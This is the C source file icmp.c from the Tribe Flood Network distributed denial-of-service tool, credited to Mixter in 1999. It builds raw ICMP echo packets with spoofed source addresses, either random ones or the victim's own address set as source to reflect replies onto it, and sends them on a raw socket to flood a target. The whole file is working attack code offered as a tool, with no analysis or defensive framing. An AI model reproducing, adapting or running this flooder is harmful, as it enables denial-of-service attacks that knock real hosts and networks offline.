/* icmp.c - tribe flood network icmp flooder
   (c) 1999 by Mixter - PRIVATE */

#include "tubby.h"

void
icmp (u_long lamer, u_long src)
{
  struct sockaddr_in pothead;
  struct iphdr *ip;
  struct icmphdr *icmp;
  char *packet;
  int pktsize = sizeof (struct iphdr) + sizeof (struct icmphdr) + 64;

  if (psize)
    pktsize += psize;

  srandom ((time (NULL) + random ()));
  packet = malloc (pktsize);
  ip = (struct iphdr *) packet;
  icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
  memset (packet, 0, pktsize);
  ip->version = 4;
  ip->ihl = 5;
  ip->tos = 0;
  ip->tot_len = htons (pktsize);
  ip->id = htons (getpid ());
  ip->frag_off = 0;
  ip->ttl = 0xff;
  ip->protocol = IPPROTO_ICMP;
  ip->check = 0;
  if (src == 0)
    {
      ip->saddr = k00lip ();
      ip->daddr = lamer;
    }
  else
    {
      ip->saddr = lamer;
      ip->daddr = src;
    }
  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->checksum = htons (~(ICMP_ECHO << 8));

  pothead.sin_port = htons (0);
  pothead.sin_family = AF_INET;
  pothead.sin_addr.s_addr = ip->daddr;

  sendto (rawsock, packet, pktsize, 0, (struct sockaddr *) &pothead, sizeof (struct sockaddr));
  free (packet);
  WAITAMOMENT;
}
